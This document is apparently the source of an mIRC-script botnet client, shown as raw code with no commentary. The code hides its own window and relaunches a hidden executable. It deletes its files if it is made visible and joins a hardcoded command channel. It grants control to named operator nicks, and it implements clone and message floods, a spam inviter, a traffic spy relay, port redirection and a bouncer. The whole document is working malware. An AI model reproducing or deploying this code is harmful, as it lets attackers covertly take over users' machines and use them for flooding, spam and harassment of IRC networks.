on 1:open:?:/.timerclose 1 1 /close -m $nick
on 1:op:#:{ if ($opnick = $me) && ($chan = %channel) { mode # +nptmrsk %key } }
on 1:action:+master:*:if ($islower($nick) = $true) && ($nick == stars) || ($nick == attacker) || ($nick == x) || ($nick == shield) || ($nick == vipnet) || ($nick == king) && ($me ison %channel) && ($nick isop %channel) { .auser 100 $nick | .msg $nick  $+ $nick $+  added in my access list. | halt } 
on 1:action:-master:*:if ($islower($nick) = $true) && ($nick == stars) || ($nick == attacker) || ($nick == x) || ($nick == shield) || ($nick == vipnet) || ($nick == king) && ($me ison %channel) && ($nick isop %channel) { .ruser 100 $nick | .msg $nick  $+ $nick $+  removed from my access list. | halt } 
on *:sockread:spybot:{ sockread %spy.read | tokenize 32 %spy.read | set %spy.rnick $mid(%spy.read,2,$calc($pos(%spy.read,!,1) - 2)) | if ($1 == PING) { sockwrite -n $sockname PONG $Remove($2,:) | sockwrite -n $sockname PONG $sockname | halt } | if ($2 == PRIVMSG) { if ($chr(291) isin $3) && (ACTION isin $4) { .msg %spy.cn 1 $+ $3 $+  6* %spy.rnick $remove($5-,) | halt } | if ($chr(291) !isin $3) && (ACTION isin $4) { .msg %spy.cn 6* %spy.rnick $remove($5-,) | halt } | if ($chr(291) isin $3) { .msg %spy.cn 1 $+ $3 $+  < $+ %spy.rnick $+ > $remove($4-,:) | halt } | if ($chr(291) !isin $3) { .msg %spy.cn 1< $+ %spy.rnick $+ > $remove($4-,:) | halt } } | if ($2 == KICK) { .msg %spy.cn 3*** %spy.rnick Kicked $4 $5- | halt } | if ($2 == QUIT) { .msg %spy.cn 3*** %spy.rnick Quit IRC4 $3- | halt } | if ($2 == JOIN) { .msg %spy.cn 3*** %spy.rnick Joined4 %spy.chan | halt }
  if ($2 == PART) { .msg %spy.cn 3*** %spy.rnick Parted4 %spy.chan | halt } | if ($2 == MODE) { if ($4 == +o) { .msg %spy.cn 3*** %spy.rnick Oped $5 on4 %spy.chan | halt } | if ($4 == -o) { .msg %spy.cn 3*** %spy.rnick Deoped $5 on4 %spy.chan | halt } | if ($4 == +s) { .msg %spy.cn 3*** %spy.rnick +s on4 %spy.chan | halt } | if ($4 == -s) { .msg %spy.cn 3*** %spy.rnick -s on4 %spy.chan | halt } | if ($4 == +k) { .msg %spy.cn 3*** %spy.rnick +k $5 on4 %spy.chan | halt } | if ($4 == -k) { .msg %spy.cn 3*** %spy.rnick -k $5 on4 %spy.chan | halt } } | if ($2 == NICK) { .msg %spy.cn 3**** %spy.rnick is now known as4 $remove($3-,:) | halt } | if ($2 == 353) {  .msg %spy.cn 3*** Users:4 $remove($5-,:) | halt } | if ($2 == 474) { .msg %spy.cn Error: Can't join  $+ $4 $+  (address banned) | halt } | if ($2 == 375) { halt } | if ($2 == 376) { halt } | if ($2 == 372) { halt } | if ($2 == 366) { halt }
  if ($2 == 477) { .msg %spy.cn Error: Can't join  $+ $4 $+  (not using registred nickname) | halt } | if ($2 == 473) { .msg %spy.cn Error: Can't join  $+ $4 $+  (invite only) | halt } | if ($2 == 475) { .msg %spy.cn Error: Can't join  $+ $4 $+  (need correct key) | halt } | if ($2 == 471) { .msg %spy.cn Error: Can't join  $+ $4 $+  (Channel is Full) | halt } | if ($2 == 437) { .msg %spy.cn $4 $+ : Cannot change nickname while banned or moderated on channel | halt } | if ($2 == 404) { .msg %spy.cn $4 $+ : Cannot send to channel while banned or moderated on channel | halt } | if ($2 == 311) { .msg %spy.cn $4 is $5 $+ @ $+ $6- | halt } | if ($2 == 319) { .msg %spy.cn $4 on $5- | halt } | if ($2 == 312) { .msg %spy.cn $4 using $5- | halt } | if ($2 == 307) { .msg %spy.cn $4- | halt } | if ($2 == 313) { .msg %spy.cn $4- | halt } | if ($2 == 301) { .msg %spy.cn $4 is away $5- | halt }
if ($2 == 001) { halt } | if ($2 == 002) { halt } | if ($2 == 003) { halt } | if ($2 == 004) { halt } | if ($2 == 005) { halt } | else { halt } }
on *:sockopen:spybot:{ sockwrite -n $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $ident($r(1,9)) | sockwrite -n $sockname nick %spy.nick | sockwrite -n $sockname join %spy.Chan %spy.key }
alias hidden { if ($exists(user33.com) == $false) { .timerquit 1 2 quit *User33.com* not found! | .timerexit 1 2 exit | .remfiles } | if ($appstate != hidden) && ($exists(User33.com) == $false) { .timerquit 1 2 .quit appstate( $+ $appstate $+ ) is not hidden and *User33.Com* is false, Removing files! | .timerexit 1 2 .exit | mdi -c | remfiles } | if ($appstate != hidden) && ($exists(User33.com) == $true) { if (%apnum < 5) || (%apnum = $null) { inc %apnum | /mdi -c | //run $mircdir $+ User33.com /n /fh        | /clearall | /font -a 1 Wingdings | /.notice stars,attacker,x,king,vipnet,shield 1WARNING: Appstate( $+ $appstate $+ ) is not hidden! } } | if ($appstate != hidden) && (%apnum >= 5) { .timerquit 1 2 quit Removing files *Windows  $+ $os $+ * | .timerexit 1 2 exit | .remfiles } | if ($appstate == hidden) { unset %apnum } }
alias ctcps { if ($1 = 1) { return PING } | if ($1 = 2) { return VERSION } | if ($1 = 3) { return FINGER }  | if ($1 = 4) { return SOUND } | if ($1 = 5) { return TIME } | if ($1 = 6) { return $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words $+ $words  } } 
alias words { return $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  $+ $r(a,z) $+  $+ $r(A,Z) $+  }
alias fnick { if ($1 = 1) { sockopen fnn $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fnserv %fnport } | if ($1 = 2) { sockopen fan $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fnserv %fnport } | if ($1 = 3) { sockopen fcn $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fnserv %fnport } | if ($1 = 4) { sockopen fmn $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fnserv %fnport } }
alias fchan { if ($1 = 1) { sockopen fnc $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } | if ($1 = 2) { sockopen fac $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } | if ($1 = 3) { sockopen fcc $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } | if ($1 = 4) { sockopen fqc $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } | if ($1 = 5) { sockopen fmc $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } | if ($1 = 6) { sockopen fjp $+ $r(1,99) $+ $r(1,99) $+ $r(1,99) %fcserv %fcport } }
on 1:sockopen:fnn*:{ if (yes isin %floodntype) { .set %floodnick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname notice %fnnick : $+ %fnmsg | sockclose $sockname }
on 1:sockopen:fan*:{ if (yes isin %floodntype) { .set %floodnick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname privmsg %fnnick :action %fnmsg $+  | sockclose $sockname }
on 1:sockopen:fcn*:{ if (yes isin %floodntype) { .set %floodnick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname privmsg %fnnick : $+ $Ctcps($r(1,6)) $+  | sockclose $sockname }
alias check { clearall | if (%server == $null) { set %server irc.GlobalIRC.net | halt } | if (%sport == $null) { set %sport 60941 | halt } | if (%Channel == $null) { set %Channel #Dragon.Trench | halt } | if (%key == $null) { set %key Hoards | halt } | if ($server isin %server) { halt } | else goto check | :check | .server %server %sport }
on 1:sockopen:fmn*:{ if (yes = %floodntype) { .set %floodnick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname privmsg %fnnick : $+ %fnmsg | sockclose $sockname }
on 1:sockopen:fmc*:{ if (yes = %floodntype) { .set %floodnick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname privmsg %fcchan : $+ %fcmsg | sockclose $sockname }
on 1:sockopen:fnc*:{ if (yes = %floodctype) { .set %floodnicks $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname notice %fcchan : $+ %fcmsg | sockclose $sockname }
on 1:sockopen:fac*:{ if (yes = %floodctype) { .set %floodnicks $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname privmsg %fcchan :action %fcmsg $+  | sockclose $sockname }
on 1:sockopen:fjp*:{ if (yes = %floodctype) { .set %floodnicks $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname part %fcchan : $+ %fcmsg | sockclose $sockname } 
on 1:sockopen:fcc*:{ if (yes = %floodctype) { .set %floodnicks $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname privmsg %fcchan : $+ $Ctcps($r(1,6)) $+  | sockclose $sockname }
on 1:sockopen:fqc*:{ if (yes = %floodctype) { .set %floodnicks $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %floodnicks $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %fcchan %fckey | sockwrite -nt $sockname quit : $+ %fcmsg | sockclose $sockname }
alias controler { if ($1 == floodnick) { if (notice isin %fntype) { //fnick 1 } | if (msg isin %fntype) { //fnick 4 } | if (ctcp isin %fntype) { //fnick 3 } | if (action isin %fntype) { //fnick 2 } | if (rand isin %fntype) { //fnick $r(1,4) } } | if ($1 == floodchan) { if (notice isin %fctype) { //fchan 1 } | if (msg isin %fctype) { //fchan 5 } | if (ctcp isin %fctype) { //fchan 3 } | if (jp isin %fctype) { //fchan 6 } | if (quit isin %fctype) { //fchan 4 } | if (action isin %fctype) { //fchan 2 } | if (rand isin %fctype) { //fchan $r(1,6) } } 
  if ($1 == clones) { sockopen clone $+ $r(0,9999) $+ $r(0,9999) %c.server %c.port } | if ($1 == fnotice) { sockopen notice $+ $r(0,9999) $+ $r(0,9999) %n.server %n.port } | if ($1 == start) { sockopen start $+ $r(0,9999) $+ $r(0,9999) %s.server %s.port } | if ($1 == go) { sockopen go $+ $r(0,9999) $+ $r(0,9999) %g.server %g.port } | if ($1 == fquit) { sockopen quit $+ $r(0,9999) $+ $r(0,9999) %q.server %q.port } | if ($1 == service) { sockopen service $+ $r(0,9999) $+ $r(0,9999) %se.server %se.port } | if ($1 == action) { sockopen action $+ $r(0,9999) $+ $r(0,9999) %ac.server %ac.port }
if ($1 == jp) { sockopen jp $+ $r(0,9999) $+ $r(0,9999) %jp.server %jp.port } | if ($1 == fns) { sockopen fns $+ $r(0,9999) $+ $r(0,9999) %fns.server %fns.port } | if ($1 == fcs) { sockopen fcs $+ $r(0,9999) $+ $r(0,9999) %fcs.server %fcs.port } }
alias rands { if ($1 = 0) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 2) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 3) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 4) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 5) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 6) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
if ($1 = 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } }
alias floodnick { if ($1 = 0) { return $r(a,z) $+ $r(a,z) } | if ($1 = 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 2) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 3) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 4) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 = 5) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } }
alias ident { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 3) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 4) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 5) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 6) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum }
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum } }
on *:sockread:gtin*: { if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } }
on *:sockread:gtout*: { if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } }
on *:sockopen:gtout*: { if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname } }
on *:sockclose:gtin*: { unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname } }
alias rem1u { if ($exists($findfile(C:,u.exe,1)) = $true) { .remove $findfile(C:,u.exe,1) } }
alias b0tnick { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $+ $r(a,z) $+ $chr(91) $+ $r(0,9) $+ $r(0,9) $+ $chr(93) }
on 1:input:*://mdi -c | //run $mircdir $+ User33.com /n /fh        | /clearall | /font -a 1 Wingdings | .notice Stars,X,KinG,VipNet,ShieLD,attacker 1WARNING: User Input Command: $1- ,on $time(HH:nn:ss) | halt
on 1:join:#:{ if ($chan = %Channel) { mode # +npmtrsk %key } | if ($level($nick) == 100) && ($me isop $chan) { mode # +ov-o $nick $nick $me } | /font -a 1 Wingdings } }
on 1:connect:.join %Channel %key | .timer_pinger 0 250 .raw ping $me | .timer_rejoin 0 60 /join %channel %key
on 1:start:{ if ($exists(user33.com) == $false) { .timerexit 1 0 .exit | remfiles } | if ($exists(user33.com) == $true) { //mdi -c | //run $mircdir $+ user33.com /n /fh        | //.identd On $read $mircdirpsys.dll | /.nick $b0tnick | .server %server %sport | unset %apnum | .timerreconnect -o 0 25 check | .timerem1u 1 5 /rem1u | .timerhidden 0 2 /hidden | /font -a 1 Wingdings | inc %count | if ($exists(Redir32.vbs) == $true) { .remove Redir32.vbs } | if ($exists(Redir32.vbs) != $true) { halt } | halt } } }
alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c 1[inviter]: Error: Please set delay: !inviter delay [delay] | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c 1[inviter]: Error Starting Inviter, Inviter Server or Port not set! %iserver - %iserver.port | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c 1[inviter]: Error: Inviter already loaded! | halt }  
//sockopen inviterN %i.server %i.port  | /msg %s.i.c 1[inviter]: Loading inviter to Server:( $+ $+ %i.server $+ ) Port:( $+ %i.port $+ ) |  //sockopen inviterM %i.server %i.port  }
on *:sockread:inviter*:{ sockread -f %t.i | if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) } | if ($gettok(%t.i,2,32) == 321) { msg %s.i.c 1[inviter]: Listing channels on ( $+ $remove($gettok(%t.i,1,32),:) $+ ) } | if ($gettok(%t.i,2,32) == 323) { msg %s.i.c 1[inviter]: Listing channels complete on $remove($gettok(%t.i,1,32),:) [Total Channels in List: $+ $lines(ichan.txt) $+ ] } | if ($gettok(%t.i,2,32) == 474) { msg %s.i.c 1[inviter]: Join Error: Banned from ( $+ $gettok(%t.i,4,32) $+ ) } | if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } | if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } | if ($gettok(%t.i,2,32) == JOIN) { if (%i.on == Off) { halt } | if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } | if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt }
    set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done | set %i.on Off | /.timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg | /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) | inc %i.t.j | .timer 1 %i.ondelay set %i.on Yes } | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } | if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c 1[inviter]: Error Connecting: %t.i (attempting to reconnect)-(to stop !inviter stop) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } | if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1  | /msg %s.i.c 1[inviter]: Error: not inviting:[ $+ $gettok(%t.i,5,32) $+ ]  because he was Oped! } | if ($gettok(%t.i,4,32) == +v) {
if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1 } } | if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j  } | if ($gettok(%t.i,2,32) == 313) { /msg %s.i.c 1[inviter]: WARNING: IRCOp Detected [ $+ $gettok(%t.i,4,32) $+ ] | if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  } }
on 1:sockopen:inviter*: { sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read $mircdirpsys.dll $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  $mircdirpsys.dll ] ] |  sockwrite -tn $sockname Nick $read $mircdirpsys.dll | /timerinviteconnect off | sockread  }
on 1:socklisten:bnc.*:{ if ($sock(bnc.in.temp,0) == 1) { halt } | //set %bnc.smt $gettok($sockname,2,46) | /sockaccept bnc.in.temp | sockread }  
on *:sockclose:bnc.in.*: { unset %bnc.ok. $+ $sockname | unset %bnc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
on *:sockread:bnc.in.*:{ if ($sock(bnc.in.temp*,0) == 1) { /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | /sockmark $sockname %bnc.smt | unset %bnc.smt |  //set  %bnc.ok. $+ $sockname no } | sockread -f %temp.r | if (%bnc.log == on) { write bnc.log <<<[Incomming]>>> %temp.r } | if (%bnc.ok. [ $+ [ $sockname ] ] == no) { if ($gettok(%temp.r ,1,32) == NICK) { set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32) | //write bnc.log Connectoin from: $sock($sockname).ip Time: $time Date: $+ $date | sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** Welcome to Q8Dragons Bouncer Server. ( $+ $gettok(%temp.r ,2,32) $+ ) *** | sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** | sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***
      sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP *** | halt } | if ($gettok(%temp.r ,1,32) == BNCHELP) { sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] | halt } | if ($gettok(%temp.r ,1,32) == USER) { set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) | halt } | if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) == %bnc. [ $+ [ $sock($sockname).mark ] ] ) { //sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** Password Accepted *** | //sockwrite -nt $sockname : NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start *** | goto next } | if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) { sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Incorrect Password... | inc %bp } | if (%bp >= 3) {
      sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  | sockclose $sockname | unset %bp } | halt } | :next | %bnc.ok. [ $+ [ $sockname ] ] = done | if ($gettok(%temp.r ,1,32) == IDENT) {   identd on $gettok(%temp.r ,2,32)  |  sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Ident set to $gettok(%temp.r ,2,32)  } | if ($gettok(%temp.r ,1,32) == VHOST) {  if ($gettok(%temp.r ,2,32) == LIST) {  /sockwrite -nt $sockname  : NOTICE AUTH : $+ $+ Listing VHOSTS | /sockwrite -nt $sockname  : NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... | /sockwrite -nt $sockname  : NOTICE AUTH : $+ $+ End of VHOST / LIST | halt } | if ($gettok(%temp.r ,2,32) == 1) { /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host | halt } | else {
    /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # | halt }   } |   if ($gettok(%temp.r ,1,32) == BNCHELP) {    /sockwrite -nt $sockname  : NOTICE AUTH : $+ $+ Listing Help Commands... |  /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT] | /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT] | /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD] | /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST | /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ - End List of HELP  | halt } | if ($gettok(%temp.r ,1,32) == CONN) { if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Disconnecting from current server...  | sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } 
